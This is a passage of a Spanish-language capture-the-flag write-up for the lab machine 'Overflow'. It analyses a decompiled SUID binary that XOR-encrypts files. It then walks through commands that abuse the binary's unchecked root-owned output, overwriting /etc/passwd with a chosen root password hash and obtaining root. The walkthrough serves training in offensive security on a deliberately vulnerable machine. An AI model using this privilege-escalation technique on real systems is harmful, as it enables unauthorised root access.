    <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
    <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
    <span class="mtk8">fprintf</span><span class="mtk1">((FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk4">"cannot</span> <span class="mtk4">open</span> <span class="mtk4">input</span> <span class="mtk4">file</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_84,</span> <span class="mtk1">pcVar3);</span>
  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
    <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98,</span> <span class="mtk4">"wb"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(local_14</span> <span class="mtk5">==</span> <span class="mtk1">(FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">piVar2</span> <span class="mtk5">=</span> <span class="mtk8">__errno_location</span><span class="mtk1">();</span>
      <span class="mtk1">pcVar3</span> <span class="mtk5">=</span> <span class="mtk8">strerror</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">piVar2);</span>
      <span class="mtk8">fprintf</span><span class="mtk1">((FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk4">"cannot</span> <span class="mtk4">open</span> <span class="mtk4">output</span> <span class="mtk4">file</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98,</span> <span class="mtk1">pcVar3);</span>  
      <span class="mtk8">fclose</span><span class="mtk1">(local_10);</span>
    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
      <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk8">_IO_getc</span><span class="mtk1">(local_10);</span>
        <span class="mtk5">if</span> <span class="mtk1">(local_18</span> <span class="mtk5">==</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
        <span class="mtk8">_IO_putc</span><span class="mtk1">(local_18</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">9b</span><span class="mtk1">,</span> <span class="mtk1">local_14);</span>
      <span class="mtk1">}</span>
      <span class="mtk8">fclose</span><span class="mtk1">(local_10);</span>
      <span class="mtk8">fclose</span><span class="mtk1">(local_14);</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Básicamente, lo que hace es coger un archivo, cifrarlo y escribirlo en otro archivo. Vamos a probarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cd /tmp
tester@overflow:/tmp$ mkdir .test
tester@overflow:/tmp$ cd .test
tester@overflow:/tmp/.test$ echo asdf > t
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: /tmp/.test/t
Enter Encrypted File: /tmp/.test/t_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 8
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 root   tester 5  t_enc
tester@overflow:/tmp/.test$ xxd t
00000000: 6173 6466 0a                             asdf.
tester@overflow:/tmp/.test$ xxd t_enc
00000000: fae8 fffd 91                             .....
</code></pre></div><p>Y el programa ha escrito el archivo <code>t_enc</code>, que pertenece al usuario <code>root</code>.</p><p>En el código fuente descompilado, descubrimos que el tipo de cifrado es XOR byte a byte con una clave <code>0x9b</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk8">_IO_getc</span><span class="mtk1">(local_10);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_18</span> <span class="mtk5">==</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
  <span class="mtk8">_IO_putc</span><span class="mtk1">(local_18</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">9b</span><span class="mtk1">,</span> <span class="mtk1">local_14);</span>  
<span class="mtk1">}</span>
</code></pre></div><p>Para descifrar el archivo, solamente tenemos que usar XOR byte a byte con la misma clave <code>0x9b</code>. Por ejemplo, podemos coger el volcado en hexadecimal del archivo <code>t_enc</code> y aplicarle la operación XOR con la clave:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; hex(0xfae8fffd91 ^ 0x9b9b9b9b9b)  
'0x617364660a'
</code></pre></div><p>Y obtenemos <code>asdf</code> (en hexadecimal), que son los contenidos del archivo <code>t</code>.</p><p>Hay una validación sobre el archivo que queremos cifrar: no puede ser de <code>root</code>. Sin embargo, no hay validación sobre el archivo de salida, por lo que tenemos permisos de escritura como <code>root</code>.</p><p>Teniendo esto, podemos añadir una clave pública de SSH en <code>/root/.ssh/authorized_keys</code> o sobrescribir <code>/etc/passwd</code> para indicar una contraseña para <code>root</code> en formato DES Unix. Esta vez, vamos con la segunda opción.</p><p>Veamos esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ cp t_enc t2
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 12
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 tester tester 5  t2
-rw-rw-r-- 1 root   tester 5  t_enc
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: /tmp/.test/t2
Enter Encrypted File: /tmp/.test/t2_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 16
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 tester tester 5  t2
-rw-rw-r-- 1 root   tester 5  t_enc
-rw-rw-r-- 1 root   tester 5  t2_enc
tester@overflow:/tmp/.test$ cat t2_enc
asdf
</code></pre></div><p>Hemos cifrado el archivo que ya habíamos cifrado (<code>t2</code> es una copia de <code>t_enc</code>, pero perteneciente a <code>tester</code> y no a <code>root</code>), y la salida del archivo doblemente cifrado es lo mismo que el archivo original <code>t</code> (que era <code>asdf</code>). Pues este es el truco, tenemos que escribir un archivo, cifrarlo, copiarlo y cifrarlo otra vez. El resultado del segundo proceso de cifrado estará en texto claro.</p><p>Vamos a modificar una copia de <code>/etc/passwd</code> con <code>sed</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ which openssl
/usr/bin/openssl
tester@overflow:/tmp/.test$ openssl passwd 7rocky
OO3PvAT9Z8SvU
tester@overflow:/tmp/.test$ cp /etc/passwd p1
tester@overflow:/tmp/.test$ head -1 p1
root:x:0:0:root:/root:/bin/bash
tester@overflow:/tmp/.test$ sed -i 's/root:x/root:OO3PvAT9Z8SvU/' p1  
tester@overflow:/tmp/.test$ head -1 p1
root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash
</code></pre></div><p>Hemos cambiado la <code>x</code> por <code>OO3PvAT9Z8SvU</code>. Esto provoca que al hacer <code>su root</code> se compara la contraseña insertada en formato DES Unix con <code>OO3PvAT9Z8SvU</code> y no con el <em>hash</em> en <code>/etc/shadow</code>.</p><p>Vamos a cifrar <code>p1</code> la primera vez:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: p1
Enter Encrypted File: p1_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 24
-rw-r--r-- 1 tester tester 1735  p1
-rw-rw-r-- 1 tester tester 1735  p1_enc
-rw-rw-r-- 1 tester tester    5  t
-rw-rw-r-- 1 tester tester    5  t2
-rw-rw-r-- 1 root   tester    5  t2_enc
-rw-rw-r-- 1 root   tester    5  t_enc
</code></pre></div><p>Ahora creamos una copia de <code>p1_enc</code> como <code>p2</code> y lo ciframos. La salida será escrita en <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ cp p1_enc p2
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: p2
Enter Encrypted File: /etc/passwd
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ head -1 /etc/passwd
root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash
</code></pre></div><p>Y hemos sobrescrito el archivo <code>/etc/passwd</code> correctamente. Ahora podemos acceder como <code>root</code> con la contraseña <code>7rocky</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ su root
Password:
root@overflow:/tmp/.test# cat /root/root.txt  
b3ae2337f9ea07d8a4c9b8613ad860a0
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem"><p class="f5 b mb3">Contenidos de este write-up</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#acceso-como-admin">Acceso como <code>admin</code></a></li><li><a href="#encontrando-un-sqli">Encontrando un SQLi</a></li><li><a href="#explotación-de-sqli">Explotación de SQLi</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#movimiento-lateral-a-developer">Movimiento lateral a <code>developer</code></a></li><li><a href="#movimiento-lateral-a-tester">Movimiento lateral a <code>tester</code></a></li><li><a href="#analizando-un-binario-suid">Analizando un binario SUID</a></li><li><a href="#explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>